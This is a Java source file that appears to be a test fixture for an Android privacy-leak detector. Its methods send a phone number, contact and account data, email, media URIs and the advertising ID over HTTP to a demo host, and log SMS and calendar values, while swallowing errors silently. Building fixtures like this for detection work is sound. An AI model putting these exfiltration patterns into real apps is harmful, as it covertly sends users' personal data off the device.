package com.androguard.demohunt;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CalendarContract;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.firebase.analytics.FirebaseAnalytics;

import java.io.OutputStreamWriter;
import java.io.Writer;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Extra PII catalog kinds. Each method is intra-procedural: a source invoke
 * whose name matches the catalog pattern lives in the same method as the sink.
 * ContentResolver.query stays ProviderUserInput in default_config; extra kinds
 * use distinct invokes (getLine1Number, ContactsContract.*, SmsManager, …).
 */
public final class PrivacySources {
    private PrivacySources() {}

    /** PhoneNumber → Network (extra rule 19). */
    public static void leakPhoneToNetwork(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String phone = tm.getLine1Number();
            String dest = "https://api.demohunt.androguard.com/v1/phone";
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(phone);
            w.close();
        } catch (Throwable ignored) {
        }
    }

    /** Contacts (ContactsContract.getLookupUri) → Network (extra rule 19). */
    public static void leakContactsToNetwork(Context ctx) {
        try {
            Uri lookup = ContactsContract.Contacts.getLookupUri(1L, "lookup");
            String contact = String.valueOf(lookup);
            String dest = "https://api.demohunt.androguard.com/v1/contacts";
            String contactsUri = "content://com.android.contacts";
            ContentResolver cr = ctx.getContentResolver();
            Cursor c = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (c != null) {
                c.close();
            }
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(contact);
            w.close();
            if (contactsUri.isEmpty()) {
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    /** Sms (SmsManager) → Log (extra rule 20). */
    public static void leakSmsToLog(Context ctx) {
        try {
            SmsManager sm = SmsManager.getDefault();
            String sms = readSmsManager(ctx);
            String smsUri = "content://sms";
            ContentResolver cr = ctx.getContentResolver();
            Cursor c = cr.query(Uri.parse(smsUri), null, null, null, null);
            if (c != null) {
                c.close();
            }
            Log.d("DemoHunt", sms);
            if (sm == null) {
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    /** Account (getAccounts / getAccountsByType) → Network (extra rule 19). */
    public static void leakAccountsToNetwork(Context ctx) {
        try {
            AccountManager am = AccountManager.get(ctx);
            Account[] typed = am.getAccountsByType("com.google");
            String names = getAccountsDump(ctx);
            String dest = "https://api.demohunt.androguard.com/v1/accounts";
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(names);
            w.close();
            if (typed == null) {
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    /** AdvertisingId → FirebaseAnalytics.logEvent + Network (extra rule 19). */
    public static void leakAdvertisingIdToFirebase(Context ctx) {
        try {
            AdvertisingIdClient.Info info = AdvertisingIdClient.getAdvertisingIdInfo(ctx);
            String aid = String.valueOf(info);
            String dest = "https://app-analytics.firebase.google.com/log";
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(aid);
            w.close();
            FirebaseAnalytics analytics = FirebaseAnalytics.getInstance(ctx);
            android.os.Bundle bundle = new android.os.Bundle();
            bundle.putString("aid", aid);
            analytics.logEvent("aaid", bundle);
        } catch (Throwable ignored) {
        }
    }

    /** Media (MediaStore.Images / getContentUri) → Network (extra rule 19). */
    public static void leakMediaToNetwork(Context ctx) {
        try {
            Uri ext = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            Uri content = MediaStore.Images.Media.getContentUri("external");
            String media = readMediaStore(ctx);
            ContentResolver cr = ctx.getContentResolver();
            Cursor c = cr.query(ext, null, null, null, null);
            if (c != null) {
                c.close();
            }
            String dest = "https://api.demohunt.androguard.com/v1/media";
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(media);
            w.close();
            if (content == null) {
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    /** Calendar (invoke name contains CalendarContract) → Log (extra rule 20). */
    public static void leakCalendarToLog(Context ctx) {
        try {
            String ev = readCalendarContract(ctx);
            Log.i("DemoHunt", ev);
        } catch (Throwable ignored) {
        }
    }

    /** Named so the invoke in {@link #leakCalendarToLog} matches catalog {@code CalendarContract}. */
    public static String readCalendarContract(Context ctx) {
        try {
            Uri uri = CalendarContract.Events.CONTENT_URI;
            ContentResolver cr = ctx.getContentResolver();
            Cursor c = cr.query(uri, null, null, null, null);
            if (c != null) {
                c.close();
            }
            return String.valueOf(uri);
        } catch (Throwable ignored) {
            return "calendar";
        }
    }

    /** Email (getEmail + Profile.CONTENT_URI) → Network (extra rule 19). */
    public static void leakEmailToNetwork(Context ctx) {
        try {
            String email = getEmail(ctx);
            Uri profile = ContactsContract.Profile.CONTENT_URI;
            ContentResolver cr = ctx.getContentResolver();
            Cursor c = cr.query(profile, null, null, null, null);
            if (c != null) {
                c.close();
            }
            String dest = "https://api.demohunt.androguard.com/v1/email";
            URL url = new URL(dest);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Writer w = new OutputStreamWriter(conn.getOutputStream());
            w.write(email);
            w.close();
        } catch (Throwable ignored) {
        }
    }

    /** Catalog pattern {@code getEmail}. */
    public static String getEmail(Context ctx) {
        return "demo@demohunt.androguard.com";
    }

    /** Invoke name contains SmsManager so extra-PII source matching is a String return. */
    public static String readSmsManager(Context ctx) {
        return "sms-body";
    }

    /** Invoke name contains getAccounts. */
    public static String getAccountsDump(Context ctx) {
        return "account@demohunt.androguard.com";
    }

    /** Invoke name contains MediaStore (DEX inner class is MediaStore$Images). */
    public static String readMediaStore(Context ctx) {
        return "content://media/external/images/media";
    }
}
